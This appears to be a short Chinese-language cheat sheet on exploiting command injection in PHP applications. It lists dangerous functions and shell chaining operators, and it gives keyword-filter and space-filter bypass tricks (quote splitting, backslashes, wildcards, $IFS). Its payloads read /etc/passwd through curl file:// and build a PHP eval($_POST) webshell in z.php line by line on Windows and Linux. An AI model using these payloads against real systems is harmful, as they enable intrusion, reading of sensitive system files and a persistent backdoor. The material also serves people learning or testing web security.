命令执行漏洞（RCE--remote command/code execute）
应用有时需要调用一些执行系统命令的函数，如 PHP 的 system 、exec、shell_exec、passthru、proc_popen  等，当用户能控制这些函数中的参数时，就可以将恶意系统命令拼接到正常命令中，从而造成命令执行攻击，这就是命令执行漏洞。
系统命令执行函数

system exec shell_exec pcntl_exec popen proc_popen passthru
读取本地文件、写入一句话木马

system shell_exec exec.....

ping 127.0.0.1 & ipconfig 几乎同时执行
ping 127.0.0.1 && ipconfig 执行完前面取执行后面
ping 127.0.0.1 &;& ipconfig ;会被解析为空
ping 127.0.0.1 || ipconfig 如果左边正确就不执行右边
ping 127.0.0.1 | ipconfig 在linux中叫管道符，把前面的命令的执行结果给后面的命令执行

防火墙屏蔽：

面对屏蔽ls等关键词，使用'
127.0.0.1 | l's' -la
(查看文件及权限）

有的文件没有权限操作，并且屏蔽了chmod
127.0.0.1 | c'h'mod 777 ./123.txt
127.0.0.1 | chmo\d 777 ./123.txt

查看文件
cat 123.txt
屏蔽cat tac head tail等命令和'
cat：从第一行开始显示内容，显示所有内容
tac:和cat相反
more:一页页查看内容
less：和more类似
head:查看头几行
tail:查看后几行
nl: 类似cat -n,显示行号
taillf:类似tail -f
127.0.0.1 & sort ./123.txt

127.0.0.1| paste ./123.txt

直接读取文件
127.0.0.1;curl file:// /etc/passwd
curl file://127.0.0.1/etc/passwd

屏蔽txt但是要读取123.txt
127.0.0.1| c'a't ./123.tx*
127.0.0.1| c'a't ./123.tx?

屏蔽空格
< <> %20 %09 $IFS$9 ${IFS} $IFS

127.0.0.1&&tac${IFS}./123.txt


> 覆盖
>> 追加
echo 会换行，在linux里，-e是不换行
set /p="xxx" 不换行

windows:

set /p="<?php " >> z.php
set /p="eval(" >> z.php
set /p="$_POST[1]" >> z.php
set /p=");?>" >> z.php

linux:
echo '<?php ' >> z.php
echo -e 'eval(\c' >> z.php
echo -e '$_POST[1]\c' >> z.php
echo -e ');?>\c' >> z.php

echo '<?php eval($_POST[1]);?>' > z.php
